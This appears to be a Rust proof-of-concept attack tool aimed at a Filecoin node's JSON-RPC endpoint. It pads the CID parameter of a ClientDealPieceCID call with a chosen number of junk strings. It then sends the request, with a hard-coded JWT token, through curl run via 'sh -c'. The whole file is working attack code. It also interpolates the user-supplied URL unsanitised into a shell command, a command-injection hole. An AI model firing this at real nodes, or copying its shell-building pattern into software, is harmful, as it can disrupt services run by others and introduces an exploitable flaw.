use clap::{arg, command, value_parser, ArgAction, Command};
use http::{Request, Response};
use std::io::prelude::*;
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command as C, Output, Stdio};
use std::str::FromStr;

fn main() {
    //Arguments
    let matches = command!()
    .arg(arg!([url]"url"))
    .arg(arg!(--num <i32> "num"))
    
    .get_matches();

    // Rpc 
    let header = "Content-Type: application/json";
    let mut rpc = r#"{"jsonrpc":"2.0","id":2,"method":"Filecoin.ClientDealPieceCID","params":[{"/": "bafy2bzacea3wsdh6y3a36tb3skempjoxqpuyompjbmfeyf34fi3uy6uue42sdsdsdsdsds"}]}"#.to_string();
    let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBbGxvdyI6WyJyZWFkIl19.pQRB0b-GRz3OifFUwf9ew5HcDG3QgNSbp8hk50h9aGQ";

    
    let mut bytes = "a".to_string();
    if let Some(count)= matches.get_one::<String>("num"){
        let range = count.parse::<i32>().unwrap();
        for _ in 0..range.clone() {
            bytes.insert_str(1, "Ass");
        }
    };


    rpc.insert_str(112, bytes.as_str());
    // Action
    if let Some(url) = matches.get_one::<String>("url") {
        let command = format!("curl -i -X POST -H \u{22}{header}\u{22} --data '{rpc}' http://{url}:1234/rpc/v0?token={token}");
        println!("{command}");
        let output = C::new("sh")
                .arg("-c")
                .arg(command)
                .spawn()
                .expect("failed to cURL").wait_with_output();
                //println!("{}", String::from_utf8_lossy(&output.unwrap().stdout))
        println!("{}", String::from_utf8_lossy(&output.unwrap().stdout))
    }
}
